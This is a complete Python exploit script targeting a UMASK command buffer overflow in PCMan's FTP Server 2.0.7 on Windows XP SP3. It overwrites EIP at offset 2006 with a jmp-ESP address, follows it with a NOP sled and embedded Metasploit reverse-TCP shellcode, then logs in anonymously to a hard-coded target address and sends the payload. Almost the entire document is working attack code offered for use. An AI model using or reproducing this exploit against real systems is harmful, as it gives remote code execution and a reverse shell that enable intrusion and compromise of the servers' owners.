#!/usr/bin/env python      
# -*- coding: utf-8 -*-

# Exploit Title:  PCMan's FTP Server 2.0.7 UMASK Command Buffer Overflow Exploit
# Date:           1/11/2016
# Exploit Author: Eagleblack
# Tested on:      Windows XP Profesional SP3 Spanish version x86
# CVE :           N/A


import socket 
ret="\x10\xb3\x3d\x7e" #USER32 this dll have a jump to ESP stack pointer

#Metasploit shellcode: 
#msfvenom -p windows/shell_reverse_tcp LHOST='IP address Local host' LPORT='' -b '\x00\x0a\x0d' -f c

shellcode = ("\xd9\xe5\xba\x7e\xd1\x2c\x95\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x31\x50\x17\x83\xe8\xfc\x03\x2e\xc2\xce\x60\x32\x0c\x8c"
"\x8b\xca\xcd\xf1\x02\x2f\xfc\x31\x70\x24\xaf\x81\xf2\x68\x5c"
"\x69\x56\x98\xd7\x1f\x7f\xaf\x50\x95\x59\x9e\x61\x86\x9a\x81"
"\xe1\xd5\xce\x61\xdb\x15\x03\x60\x1c\x4b\xee\x30\xf5\x07\x5d"
"\xa4\x72\x5d\x5e\x4f\xc8\x73\xe6\xac\x99\x72\xc7\x63\x91\x2c"
"\xc7\x82\x76\x45\x4e\x9c\x9b\x60\x18\x17\x6f\x1e\x9b\xf1\xa1"
"\xdf\x30\x3c\x0e\x12\x48\x79\xa9\xcd\x3f\x73\xc9\x70\x38\x40"
"\xb3\xae\xcd\x52\x13\x24\x75\xbe\xa5\xe9\xe0\x35\xa9\x46\x66"
"\x11\xae\x59\xab\x2a\xca\xd2\x4a\xfc\x5a\xa0\x68\xd8\x07\x72"
"\x10\x79\xe2\xd5\x2d\x99\x4d\x89\x8b\xd2\x60\xde\xa1\xb9\xec"
"\x13\x88\x41\xed\x3b\x9b\x32\xdf\xe4\x37\xdc\x53\x6c\x9e\x1b"
"\x93\x47\x66\xb3\x6a\x68\x97\x9a\xa8\x3c\xc7\xb4\x19\x3d\x8c"
"\x44\xa5\xe8\x03\x14\x09\x43\xe4\xc4\xe9\x33\x8c\x0e\xe6\x6c"
"\xac\x31\x2c\x05\x47\xc8\xa7\xea\x30\xd3\x30\x83\x42\xd3\x3f"
"\xe8\xca\x35\x55\x1e\x9b\xee\xc2\x87\x86\x64\x72\x47\x1d\x01"
"\xb4\xc3\x92\xf6\x7b\x24\xde\xe4\xec\xc4\x95\x56\xba\xdb\x03"
"\xfe\x20\x49\xc8\xfe\x2f\x72\x47\xa9\x78\x44\x9e\x3f\x95\xff"
"\x08\x5d\x64\x99\x73\xe5\xb3\x5a\x7d\xe4\x36\xe6\x59\xf6\x8e"
"\xe7\xe5\xa2\x5e\xbe\xb3\x1c\x19\x68\x72\xf6\xf3\xc7\xdc\x9e"
"\x82\x2b\xdf\xd8\x8a\x61\xa9\x04\x3a\xdc\xec\x3b\xf3\x88\xf8"
"\x44\xe9\x28\x06\x9f\xa9\x59\x4d\xbd\x98\xf1\x08\x54\x99\x9f"
"\xaa\x83\xde\x99\x28\x21\x9f\x5d\x30\x40\x9a\x1a\xf6\xb9\xd6"
"\x33\x93\xbd\x45\x33\xb6") 

buffer =  '\x41'* 2006 + ret + '\x90'* 30 + shellcode #EIP overwritten at offset 2006
print "Sending Buffer"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #open socket
connect = s.connect(('192.168.1.13',21))              #IP address and port (21) from the target
s.recv(1024)                                          #FTPBanner
s.send('USER anonymous\r\n')                          #Sending USER
s.recv(1024) 
s.send('PASS \r\n')                                   #Sending Password (Null password)
s.recv(1024)
s.send('UMASK' + buffer +'\r\n')
s.close()